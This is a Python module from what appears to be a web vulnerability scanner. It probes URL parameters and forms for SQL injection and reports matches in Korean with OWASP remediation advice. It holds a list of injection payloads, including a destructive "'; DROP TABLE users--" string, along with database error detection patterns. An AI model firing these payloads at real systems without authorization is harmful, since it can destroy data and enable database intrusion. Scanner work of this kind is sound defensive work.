"""
SQL Injection vulnerability checker
"""
import re
from typing import List, Dict, Any
from urllib.parse import urlencode, urlparse, parse_qs, urljoin
import aiohttp

from app.scanner.checks.base import BaseChecker


class SQLInjectionChecker(BaseChecker):
    """
    Check for SQL Injection vulnerabilities
    """
    
    vuln_type = "sqli"
    
    # SQL Injection payloads
    PAYLOADS = [
        "' OR '1'='1",
        "' OR '1'='1' --",
        "' OR '1'='1' /*",
        "1' OR '1'='1",
        "1 OR 1=1",
        "' UNION SELECT NULL--",
        "' UNION SELECT NULL, NULL--",
        "1' AND '1'='1",
        "1' AND '1'='2",
        "'; DROP TABLE users--",
        "1; SELECT * FROM users",
        "' OR 'x'='x",
        "\" OR \"1\"=\"1",
        "') OR ('1'='1",
        "admin'--",
        "1' ORDER BY 1--",
        "1' ORDER BY 10--",
    ]
    
    # Error patterns that indicate SQL injection
    ERROR_PATTERNS = [
        r"SQL syntax.*MySQL",
        r"Warning.*mysql_",
        r"MySqlException",
        r"valid MySQL result",
        r"PostgreSQL.*ERROR",
        r"Warning.*pg_",
        r"valid PostgreSQL result",
        r"Driver.*SQL Server",
        r"OLE DB.*SQL Server",
        r"SQLServer JDBC Driver",
        r"Microsoft SQL Native Client",
        r"ODBC SQL Server Driver",
        r"SQLite.*exception",
        r"System\.Data\.SQLite\.SQLiteException",
        r"Warning.*sqlite_",
        r"Warning.*SQLite3::",
        r"Oracle.*error",
        r"ORA-\d{5}",
        r"Oracle.*Driver",
        r"Warning.*oci_",
        r"Warning.*ora_",
        r"SQL command not properly ended",
        r"quoted string not properly terminated",
        r"unclosed quotation mark",
        r"syntax error",
        r"mysql_fetch",
        r"mysql_num_rows",
        r"mysql_query",
        r"pg_query",
        r"pg_exec",
        r"sqlite_query",
    ]
    
    async def check(
        self,
        session: aiohttp.ClientSession,
        url: str
    ) -> List[Dict[str, Any]]:
        """
        Check URL for SQL injection vulnerabilities
        """
        vulnerabilities = []
        
        # Parse URL parameters
        parsed = urlparse(url)
        params = parse_qs(parsed.query)
        
        if not params:
            # Try with common parameter names
            test_params = ['id', 'user', 'name', 'page', 'search', 'q', 'cat', 'item']
            for param in test_params:
                test_url = f"{url}?{param}=1"
                vulns = await self._test_parameter(session, test_url, param)
                vulnerabilities.extend(vulns)
        else:
            # Test existing parameters
            for param in params.keys():
                vulns = await self._test_parameter(session, url, param)
                vulnerabilities.extend(vulns)
        
        return vulnerabilities
    
    async def check_form(
        self,
        session: aiohttp.ClientSession,
        form_data: Dict[str, Any]
    ) -> List[Dict[str, Any]]:
        """
        Check form for SQL injection vulnerabilities
        """
        vulnerabilities = []
        
        action_url = form_data.get('action', '')
        method = form_data.get('method', 'GET')
        inputs = form_data.get('inputs', [])
        
        for input_field in inputs:
            input_name = input_field.get('name', '')
            if not input_name:
                continue
            
            # Skip hidden and submit inputs
            input_type = input_field.get('type', 'text')
            if input_type in ['hidden', 'submit', 'button']:
                continue
            
            for payload in self.PAYLOADS[:5]:  # Test first 5 payloads
                # Build form data
                data = {}
                for inp in inputs:
                    if inp['name'] == input_name:
                        data[inp['name']] = payload
                    else:
                        data[inp['name']] = inp.get('value', 'test')
                
                try:
                    if method == 'POST':
                        async with session.post(
                            action_url,
                            data=data,
                            timeout=aiohttp.ClientTimeout(total=10),
                            ssl=False
                        ) as response:
                            text = await response.text()
                    else:
                        async with session.get(
                            action_url,
                            params=data,
                            timeout=aiohttp.ClientTimeout(total=10),
                            ssl=False
                        ) as response:
                            text = await response.text()
                    
                    # Check for SQL errors
                    for pattern in self.ERROR_PATTERNS:
                        if re.search(pattern, text, re.IGNORECASE):
                            vulnerabilities.append(self.create_vulnerability(
                                name="SQL Injection (Form)",
                                severity="critical",
                                url=action_url,
                                description=f"폼 필드 '{input_name}'에서 SQL Injection 취약점이 발견되었습니다. "
                                           f"공격자가 데이터베이스를 조작하거나 민감한 정보를 탈취할 수 있습니다.",
                                evidence=f"Payload: {payload}\nPattern matched: {pattern}",
                                parameter=input_name,
                                method=method,
                                recommendation="1. Prepared Statements(매개변수화된 쿼리)를 사용하세요.\n"
                                              "2. 입력값 검증 및 이스케이프 처리를 수행하세요.\n"
                                              "3. 최소 권한 원칙을 적용하여 DB 사용자 권한을 제한하세요.",
                                references=[
                                    "https://owasp.org/www-community/attacks/SQL_Injection",
                                    "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
                                ],
                                cwe_id="CWE-89",
                                cvss_score=9
                            ))
                            return vulnerabilities  # Stop after first finding
                            
                except Exception:
                    continue
        
        return vulnerabilities
    
    async def _test_parameter(
        self,
        session: aiohttp.ClientSession,
        url: str,
        param: str
    ) -> List[Dict[str, Any]]:
        """
        Test a specific parameter for SQL injection
        """
        vulnerabilities = []
        parsed = urlparse(url)
        base_url = f"{parsed.scheme}://{parsed.netloc}{parsed.path}"
        
        for payload in self.PAYLOADS[:8]:  # Test first 8 payloads
            test_url = f"{base_url}?{param}={payload}"
            
            try:
                async with session.get(
                    test_url,
                    timeout=aiohttp.ClientTimeout(total=10),
                    ssl=False,
                    allow_redirects=True
                ) as response:
                    text = await response.text()
                    
                    # Check for SQL error patterns
                    for pattern in self.ERROR_PATTERNS:
                        if re.search(pattern, text, re.IGNORECASE):
                            vulnerabilities.append(self.create_vulnerability(
                                name="SQL Injection",
                                severity="critical",
                                url=url,
                                description=f"파라미터 '{param}'에서 SQL Injection 취약점이 발견되었습니다. "
                                           f"공격자가 악의적인 SQL 쿼리를 삽입하여 데이터베이스를 조작하거나 "
                                           f"민감한 정보를 탈취할 수 있습니다.",
                                evidence=f"Payload: {payload}\nURL: {test_url}\nError pattern: {pattern}",
                                parameter=param,
                                method="GET",
                                recommendation="1. Prepared Statements(매개변수화된 쿼리)를 사용하세요.\n"
                                              "2. ORM을 사용하여 직접적인 SQL 쿼리를 피하세요.\n"
                                              "3. 입력값의 타입과 길이를 검증하세요.\n"
                                              "4. 에러 메시지에 상세한 DB 정보가 노출되지 않도록 하세요.",
                                references=[
                                    "https://owasp.org/www-community/attacks/SQL_Injection",
                                    "https://cheatsheetseries.owasp.org/cheatsheets/SQL_Injection_Prevention_Cheat_Sheet.html"
                                ],
                                cwe_id="CWE-89",
                                cvss_score=9
                            ))
                            return vulnerabilities  # Stop after first finding
                            
            except Exception:
                continue
        
        return vulnerabilities

